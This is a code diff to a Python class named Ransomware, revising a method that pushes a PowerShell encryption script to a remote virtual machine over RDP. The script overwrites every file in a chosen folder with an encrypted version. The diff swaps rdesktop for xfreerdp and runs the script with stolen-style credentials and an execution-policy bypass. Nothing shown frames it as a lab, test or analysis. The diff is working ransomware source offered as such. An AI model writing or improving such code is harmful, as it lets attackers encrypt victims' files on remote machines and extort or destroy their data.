@@ -20,7 +20,7 @@ class Ransomware:
 
     # Encrypt all files in a folder on a different VM using RDP (rdesktop)
     def vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
-        # Create the script file content for the target VM
+        # Create the PowerShell script content for the target VM
         script_content = f'''
 $key = "{self.key.decode()}"
 $folderPath = "{folder_path}"
@@ -33,22 +33,17 @@ foreach ($file in $files) {{
     Set-Content -Path $file.FullName -Value $encryptedData -Encoding Byte
 }}
 '''
-
         # Generate a random script name
         script_name = "encrypt_script.ps1"
-        script_path = os.path.join(os.getcwd(), script_name)
 
-        # Write the script file locally
-        with open(script_path, 'w') as script_file:
-            script_file.write(script_content)
-
-        # Copy the script file to the target VM using RDP (rdesktop)
-        copy_script_command = f'echo {script_path} | rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" {target_vm_ip}'
+        # Copy the script file to the target VM using RDP (xfreerdp)
+        copy_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -Command \\"$scriptContent = \\"{script_content}\\"; $scriptContent | Out-File -FilePath \\"{script_name}\\" -Encoding UTF8\\""'
         subprocess.Popen(copy_script_command, shell=True)
 
-        # Run the script on the target VM using RDP (rdesktop)
-        run_script_command = f'rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" -s "powershell -ExecutionPolicy Bypass -File /home/{rdp_username}/{script_name}" {target_vm_ip}'
+        # Run the script on the target VM using RDP (xfreerdp)
+        run_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -File \\"{script_name}\\""'
         subprocess.Popen(run_script_command, shell=True)
+
 
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder(self, folder_path):
